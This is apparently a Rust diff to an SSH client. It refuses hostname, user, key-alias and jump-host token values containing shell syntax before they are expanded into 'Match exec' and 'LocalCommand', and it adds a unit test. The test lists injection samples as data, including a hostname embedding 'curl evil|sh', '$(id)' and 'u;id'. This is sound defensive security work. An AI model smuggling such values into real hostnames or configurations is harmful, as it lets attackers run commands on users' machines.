@@ -1900,6 +1900,12 @@ fn final_config_pass(
         return Ok(());
     }
     if canonical {
+        // The name now comes from the configuration's domains and the DNS
+        // (a CNAME target), not the command line: it becomes `%h`, so it is
+        // held to the same rule as the name typed.
+        if !valid_hostname(&host) {
+            return Err("canonicalized hostname contains invalid characters".into());
+        }
         // The canonical name is the connection target from now on.
         cfg_block.host_name = Some(host.clone());
     }
@@ -3729,9 +3735,10 @@ fn run() -> Result<i32, String> {
             .as_deref()
             .filter(|c| !c.is_empty() && !c.eq_ignore_ascii_case("none"))
     {
-        run_local_command(
-            &tokens.expand(&cmd.replace("%T", tun_ifname.as_deref().unwrap_or("NONE"))),
-        );
+        match tokens.expand_for_shell(&cmd.replace("%T", tun_ifname.as_deref().unwrap_or("NONE"))) {
+            Ok(cmd) => run_local_command(&cmd),
+            Err(e) => warn!("LocalCommand not run: {e}"),
+        }
     }
 
     // `-N`: no session; keep the connection (and its forwards) alive.
@@ -5198,6 +5205,54 @@ impl Tokens {
         out
     }
 
+    /// [`Self::expand`] for a string a shell will run (`Match exec`,
+    /// `LocalCommand`): the tokens whose values can come from outside the
+    /// configuration — the DNS, the command line — are refused unless they
+    /// are plain names, so none can add shell syntax of its own. Only the
+    /// tokens `s` actually uses are checked.
+    fn expand_for_shell(&self, s: &str) -> Result<String, String> {
+        let mut used = [false; 5];
+        let mut chars = s.chars();
+        while let Some(c) = chars.next() {
+            if c == '%' {
+                match chars.next() {
+                    Some('h') => used[0] = true,
+                    Some('n') => used[1] = true,
+                    Some('k') => used[2] = true,
+                    Some('r') => used[3] = true,
+                    Some('j') => used[4] = true,
+                    _ => {}
+                }
+            }
+        }
+        let host_like = [
+            ('h', &self.host, "hostname"),
+            ('n', &self.original, "hostname"),
+            ('k', &self.key_alias, "host key alias"),
+        ];
+        for (i, (token, value, what)) in host_like.into_iter().enumerate() {
+            if used[i] && !valid_hostname(value) {
+                return Err(format!("%{token}: {what} contains invalid characters"));
+            }
+        }
+        if used[3] && !valid_ruser(&self.remote_user) {
+            return Err("%r: remote username contains invalid characters".into());
+        }
+        // `[user@]host[:port]` hops, comma-separated.
+        if used[4]
+            && !self.jump.split(',').all(|hop| {
+                let (user, host) = match hop.rsplit_once('@') {
+                    Some((u, h)) => (Some(u), h),
+                    None => (None, hop),
+                };
+                valid_hostname(host) && user.is_none_or(valid_ruser)
+            })
+        {
+            return Err("%j: jump host contains invalid characters".into());
+        }
+        Ok(self.expand(s))
+    }
+
     /// A file name as OpenSSH takes it: `~`, then `${VAR}`, then tokens.
     /// (`~` alone is the home directory with a `/`, as tilde_expand_filename.)
     fn expand_path(&self, s: &str) -> String {
@@ -5293,7 +5348,16 @@ fn match_exec(
         .unwrap_or_default();
     let mut tokens = Tokens::new(&cli.host, &host, port, &ruser, opts, cli);
     tokens.key_alias = opts.host_key_alias.clone().unwrap_or_else(|| host.clone());
-    let cmd = tokens.expand(cmd);
+    // A name from the DNS (CanonicalizeHostname) must not reach the shell
+    // with syntax of its own. Refusing beats treating the criterion as
+    // unmatched, which would silently skip the block's settings.
+    let cmd = match tokens.expand_for_shell(cmd) {
+        Ok(c) => c,
+        Err(e) => {
+            eprintln!("Match exec '{}': {e}", sanitize_terminal_str(cmd));
+            std::process::exit(255);
+        }
+    };
     #[cfg(unix)]
     let (shell, flag) = (
         std::env::var("SHELL")
@@ -8527,6 +8591,46 @@ mod extra_o_tests {
         assert!(err.contains("newline"), "{err}");
         // Plain values still parse.
         assert!(parse_args(&args(&["-o", "User=x", "host"])).is_ok());
+    }
+
+    /// `Match exec` / `LocalCommand` go to a shell: a `%h` from the DNS (or
+    /// any other outside value) with shell syntax is refused, not expanded.
+    #[test]
+    fn shell_expansion_refuses_unsafe_token_values() {
+        let cli = parse_args(&args(&["host"])).unwrap();
+        let cfg = puressh::config::ClientOptions::default();
+        let tokens = |host: &str, user: &str| Tokens::new("host", host, 22, user, &cfg, &cli);
+        let ok = tokens("db1.corp.example.com", "alice");
+        assert_eq!(
+            ok.expand_for_shell("test %h = x -a %r = y -a %p -eq 22 # 100%%h")
+                .unwrap(),
+            "test db1.corp.example.com = x -a alice = y -a 22 -eq 22 # 100%h"
+        );
+        for host in [
+            "x`curl evil|sh`.corp.example.com",
+            "a b",
+            "a;b",
+            "$(id)",
+            "a\nb",
+            "-oProxyCommand=x",
+        ] {
+            let t = tokens(host, "alice");
+            assert!(t.expand_for_shell("ping -c1 %h").is_err(), "{host:?}");
+            // Unused, it is not looked at; `%%h` is not a use.
+            assert_eq!(t.expand_for_shell("true %%h %p").unwrap(), "true %h 22");
+            // `%k` defaults to the name as given, which stays fine.
+            assert!(t.expand_for_shell("echo %n %k").is_ok());
+        }
+        let t = tokens("h", "u;id");
+        assert!(t.expand_for_shell("echo %r").is_err());
+        assert!(t.expand_for_shell("echo %h").is_ok());
+        let mut t = tokens("h", "u");
+        t.key_alias = "a|b".into();
+        assert!(t.expand_for_shell("echo %k").is_err());
+        t.jump = "jump1,user@jump2:2222".into();
+        assert!(t.expand_for_shell("echo %j").is_ok());
+        t.jump = "jump1,`id`@jump2".into();
+        assert!(t.expand_for_shell("echo %j").is_err());
     }
 
     #[test]
